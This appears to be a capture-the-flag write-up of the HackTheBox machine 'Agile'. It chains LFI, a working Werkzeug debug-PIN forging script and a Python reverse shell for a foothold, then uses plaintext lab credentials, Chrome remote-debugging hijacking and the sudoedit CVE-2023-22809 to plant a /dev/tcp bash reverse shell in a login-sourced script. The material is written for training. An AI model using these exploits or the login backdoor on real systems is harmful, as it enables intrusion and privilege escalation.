---
created: 2025-09-18
---

📅 `2025-09-18`

#web-app #lfi #authenticated #flask #flask-console #database #chrome-remote-debugging

----

## 🖥️ Box Info

| ️🏷️ Name         |  `Agile`   |
| --------------- | --- |
| 📆 Release Date |   `2023-03-04`  |
| 🌐 IP Address   |  `10.10.11.203`   |
| 🖥️ OS           |   `Linux`  |
| 🎯 Difficulty   |   `Medium`  |

----

## 🧠 Summary


**🧩 Key Concepts:** 

- Authenticated web app testing
- `LFI`
- `Flask` debug mode console
- `Flask` app pin forging
- Database
- `Chrome` remote debugging
- Lateral movement
- Editing global script sourced by users on login

**🛠️ Tools:**  

- `Burp Suite`
- `Penelope`

**📚 Learned:**  

- Try including `/proc/self/environ` to see environment variables via `LFI`.
- Use `Chrome` for interacting with a remote debugging `Chrome` session. Simply navigate to `chrome://inspect`, add the IP and port of the session to the target discovery settings (if it's not already there) and click inspect. We should be able to interact with a remote browser session.
- Read scripts that are sourced on login like `/etc/bash.bashrc`.

----

## 🌐 Port Scan

- **TCP**: 22, 80

---

## 🔍 Enumeration

The only port worth looking at is `80`. The web server redirects to `superpass.htb`, so I added that to `/etc/hosts`. The site is for a password manager.

![[Pasted image 20250917130746.png]]

The "Login" button redirects to this:

![[Pasted image 20250917130831.png]]

Looks like a custom-made login panel, and when submitting an `SQLi` payload I get this error:

![[Pasted image 20250917130859.png]]

Apparently it is not vulnerable to `SQL` injection, and the error was just a timeout. Fuzzing for subdomains and directories found nothing, so let's create an account.

I first added a password:

![[Pasted image 20250917154451.png]]

And clicked the `Export` button. These were the requests:

![[Pasted image 20250917154516.png]]

A `.csv` file was downloaded.

Looking at the requests, I get redirected to `/download?fn=<filename>`. The web app sends files to the client based on the file name passed in the `fn` `URL` parameter. I tried to get a file that does not exist and it gave me this error:

![[Pasted image 20250917154557.png]]

The error shows we are in `/tmp`, so I tried local file inclusion.

![[Pasted image 20250917154754.png]]

Got `LFI`.

---

## 🪜 Foothold

When debug mode is enabled, we may be able to access the debug console and run arbitrary `Python` commands. I just clicked the console icon on one of the lines of the stack trace and got this message:

![[Pasted image 20250918010404.png]]

Researching this PIN, I found we can forge one and get access to the console. I found [this article](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/werkzeug.html) from `HackTricks` with the required information to exploit this. Forging the PIN requires values from the environment, so I included `/proc/self/environ` and got this response:

![[Pasted image 20250918011512.png]]

We got the environment variables of the current process, including the path to the app's config file.

>[!tip]
>`/proc/self/` is a symlink to the current process' `/proc/` directory.

I ended up using the code in the article and filling in the target's values. [This video](https://www.youtube.com/watch?v=6BWaea0nfE0) explains that the values can change if the app is running on `gunicorn`, which the target is. This is the final, working code (got the user from `/proc/self/environ` and the path from the crash message).

```shell
import hashlib
from itertools import chain

probably_public_bits = [
    'www-data',  # username
    'flask.app',  # modname
    'wsgi_app',  # getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/app/venv/lib/python3.10/site-packages/flask/app.py'  # getattr(mod, '__file__', None),
]

private_bits = [
    '345051815045',  # str(uuid.getnode()),  /sys/class/net/ens33/address
    'ed5b159560f54721827644bc9b220d00superpass.service'  # get_machine_id(), /etc/machine-id
]

# h = hashlib.md5()  # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0
h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')
# h.update(b'shittysalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)
```

It printed this PIN:

```shell
python exploit.py
204-471-235
```

Let's try it:

![[Pasted image 20250918014642.png]]

It worked. I pasted a `Python` reverse shell payload from www.revshells.com and caught it with `Penelope`.

![[Pasted image 20250918014811.png]]

Got a foothold.

---

## 👤 User

We already have the config file path, so let's read it.

```shell
(venv) www-data@agile:/app$ cat config_prod.json
{"SQL_URI": "mysql+pymysql://superpassuser:dSA6l7q*yIVs$39Ml6ywvgK@localhost/superpass"}
```

This gave me the database credentials. Since the database belongs to the password manager, it was worth checking.

![[Pasted image 20250918014958.png]]

It had passwords for the `corum` user, so I tried them over `SSH`. The one with the `agile` `URL` looks promising, since that's the hostname of the target machine.

- `corum`:`5db7caa1d13cc37c9fc2`


![[Pasted image 20250918015056.png]]

Got user.

---

## 🛡️ Privilege Escalation

Using `pspy64` I found a `Chrome` process was being started with a remote debugging port enabled (41829). I installed `Chrome`, navigated to `chrome://inspect`, logged in via `SSH` with `-L 41829:localhost:41829`, and added it to the target discovery settings.

![[Pasted image 20250918135758.png]]

A session appeared quickly. I entered it by clicking `inspect`.

![[Pasted image 20250918140042.png]]

It had the website logged in as `edwards`.

![[Pasted image 20250918140059.png]]

We can use the session remotely as if it were a regular browser. Clicking on `Vault`, I found the password for user `edwards` for the machine.

![[Pasted image 20250918140140.png]]

I tried logging in via `SSH` and it worked. We got user `edwards`.

- `edwards`:`d07867c6267dcb5df0af`

Running `sudo -l` showed this:

```
edwards@agile:~$ sudo -l 
[sudo] password for edwards: 
Matching Defaults entries for edwards on agile:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User edwards may run the following commands on agile:
    (dev_admin : dev_admin) sudoedit /app/config_test.json
    (dev_admin : dev_admin) sudoedit /app/app-testing/tests/functional/creds.txt
```

We can run `sudoedit` as user `dev_admin` with 2 specific files.

I found a `CVE` that lets us edit arbitrary files (in this case, any file writable by user `dev_admin`). It's `CVE-2023-22809`. Exploiting it only requires setting the `EDITOR` environment variable to `vim -- <file/path>` and then running the `sudoedit` command.

I tried this with lots of files, even the `.ssh/id_rsa` of all users, but nothing came up. I ended up taking a hint from `HTB`. The hint was about a file that was sourced by every user on login. This was `/etc/bash.bashrc`. It had this line at the end:

```shell
<SNIP>
# all users will want the env associated with this application
source /app/venv/bin/activate
```

This was the `venv` activation script. These were the permissions on that `activate` file:

```shell
edwards@agile:~$ ls -l /app/venv/bin/activate
-rw-rw-r-- 1 root dev_admin 1976 Sep 18 19:57 /app/venv/bin/activate
```

`dev_admin` can edit it. I ran this:

```shell
edwards@agile:~$ export EDITOR="vim -- /app/venv/bin/activate"
edwards@agile:~$ sudoedit -u dev_admin /app/config_test.json
```

And it opened the file for editing. I created a `bash` reverse shell payload with `revshell bash 1234` and pasted it into the first line of the `activate` script.

```shell
# This file must be used with "source bin/activate" *from bash*
# you cannot run it directly

bash -c 'bash -i >& /dev/tcp/10.10.14.14/1234 0>&1'
deactivate () {
    # reset old environment variables
<SNIP>
```

Any user who logs in will now run the reverse shell.

I started `penelope` on port 1234 and waited.

![[Pasted image 20250918150212.png]]

And `root` logged into the machine.

Rooted.
